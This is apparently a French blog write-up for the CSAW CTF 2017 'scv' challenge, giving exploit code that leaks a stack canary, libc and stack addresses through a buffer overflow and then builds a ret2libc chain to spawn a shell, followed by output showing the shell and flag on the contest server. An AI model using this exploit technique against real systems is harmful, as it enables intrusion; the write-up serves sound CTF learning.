---
layout: post
title: "CSAW CTF"
date: 18 Septembre 2017
comments: true
categories: wu
---
 ===== INFOS ===== 
Filename                 scv
File format              ELF64
Architecture             x86-64
Endianess                little endian
Entry point              0x4009a0
Loadables segments       2
Sections                 29

NX bit                   enabled
SSP                      enabled
Relro                    partial
RPATH                    no rpath
RUNPATH                  no runpath
PIE                      disabled


Le binaire présente un buffer overflow assez simple. On commence par récupérer le canari
puis l'adresse de la libc via l'adresse de __libc_start_main+288 sur la pile et
enfin l'adresse de la pile.

Canari:
waitmenu()
p.sendline("1")
waitmenu()
entete='A'*168
p.sendline(entete)
print waitmenu()
p.sendline("2")
b=waitmenu()
index=b.index(entete)+len(entete)+1
canari=bword("\x00"+b[index:index+7])
print "[+] canari=",hex(canari)

libc:
entete2="A"*(168+8+8)
p.sendline("1")
waitmenu()
p.send(entete2+chr(4))
print waitmenu()
p.sendline("2")
b=waitmenu()
index=b.index(entete2)+len(entete2)
leak=bword(complete(b[index:index+6],8))
print "[+] leak libc=",hex(leak)
reference_libc='__libc_start_main'
adr_reference_libc=(leak & 0xfffffffffffff000) + (libc.sym[reference_libc] & 0xfff)
whatis('system')
system=tolibc('system')
binsh=adlibc(libc.data.index("/bin/sh\x00"))
print '[+] binsh=',hex(binsh)

pile:
entete3="A"*(168+8+8+8+8)
p.sendline("1")
waitmenu()
p.send(entete3+chr(4))
print waitmenu()
p.sendline("2")
b=waitmenu()
index=b.index(entete3)+len(entete3)
pile=bword(complete(b[index:index+6],8))
print "[+] pile=",hex(pile)

ret2libc:
poprdi=0x0000000000400ea3 # : pop rdi ; ret
pile='A'*168+p64(canari)+p64(pile)+p64(poprdi)+p64(binsh)+p64(system)+chr(4)
p.sendline("1")
waitmenu()
p.send(pile)
waitmenu()
p.sendline("3")
p.interactive()

francois@aramis:~/BFF/CSAW2017/scv$ python payload.py 
[*] '/home/francois/BFF/CSAW2017/scv/scv'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/francois/BFF/CSAW2017/scv/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>
[+] canari= 0xdfb52cad20e5a500
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>
[+] leak libc= 0x7fe354b06804
system  =  0x7fe354b2b390
[+] binsh= 0x7fe354c72d17
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>
[+] pile= 0x7fffdf4abc04
[*] Switching to interactive mode
[*]BYE ~ TIME TO MINE MIENRALS...
$ cat flag
flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
$ 
[*] Closed connection to pwn.chal.csaw.io port 3764
francois@aramis:~/BFF/CSAW2017/scv$ 
